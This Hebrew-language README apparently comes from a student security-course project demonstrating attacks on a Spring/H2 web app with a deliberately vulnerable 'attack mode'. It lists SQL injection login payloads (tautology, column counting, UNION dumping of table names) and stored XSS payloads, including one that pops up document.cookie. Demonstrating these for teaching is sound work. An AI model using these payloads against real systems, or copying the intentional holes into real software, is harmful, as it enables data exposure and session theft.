מגישים:
חן אביני 
מאיה גמבום
גיא רינסקי
סהר חזקיה
שחר אסיה


הסבר על אופן הצגת העבודה:
הורדת השרת spring:
- ישנו קובץ ZIP בשם "ide.bat" ששם נמצא הframework. מה שיש לעשות זה פשוט לפתוח את ZIP ולהיכנס לקובץ הBAT.

Attack mode button:
יכלנו לבחור בין מספר ממושים ובחרנו באחת שמונעת SQL injuction . 
על מנת לראות מתקפת sql injection הכנסנו את כפתור זה שמעביר אותנו למימוש עם חולשה(native query).
attack mode הוגדר ככזה שמייצר שאילתה זהה לשאילתות שלהלן, אך בניגוד להזנה ידנית של שאילתות אלו בconsloe של H2(ה-Data Base שאיתו אנו עובדים) שמאפשר גישה לנתונים שלא רצינו שיאופשר האתר לא מאפשר הרצתן ובכך מגן מ-SQL injuction.
להלן שלוש דוגמאות לSQL injection:
//----- run /initializeDB before ---


// -------------- To get all users ---------------
// USERNAME =    User1 , Password =   ' or 1=1 --   
// SELECT username,hash_code FROM users userentity0_ WHERE userentity0_.username='User1' AND userentity0_.hash_code=' ' or 1=1 -- '

// -------------- To get num of columns in users ---------------
// USERNAME =    User1 , Password =   ' or 1=1 ORDER BY 7 --   
// SELECT * FROM users userentity0_ WHERE userentity0_.username='User1' AND userentity0_.hash_code=' ' or 1=1 ORDER BY 7 -- '

//-------------- To get all tables names in DB ---------------
//USERNAME =    User1 , Password =   ' or 1=1 UNION SELECT table_schema,table_name FROM information_schema.tables --
// SELECT username,hash_code FROM users userentity0_ WHERE userentity0_.username='User1' AND userentity0_.hash_code=' ' or 1=1 UNION SELECT table_schema,table_name FROM information_schema.tables -- '


XSS Store:
מימשנו את ההתקפה באמצעות הזרקת script זדוני תוך שימוש בשדה username .
script זדוני לדוגמה שניתן להכניס אותו לשדה הusername.
(את הscripts הבאים יש קודם להוסיף בregister).
<IMG SRC=**file path**>   פרסום תמונה

<IFRAME SRC="javascript:alert('Maya');"></IFRAME> פאפ-אפ עם הודעה

<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME> פופ-אפ עם הודעה עם הקוקי


<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
פופ אפ עם הודעה

<A HREF="'**website_name**">XSS</A>
פרסום לינק

(המימוש של xss נמצא ב-CustomerServiceImplementation בשורות 62-63)







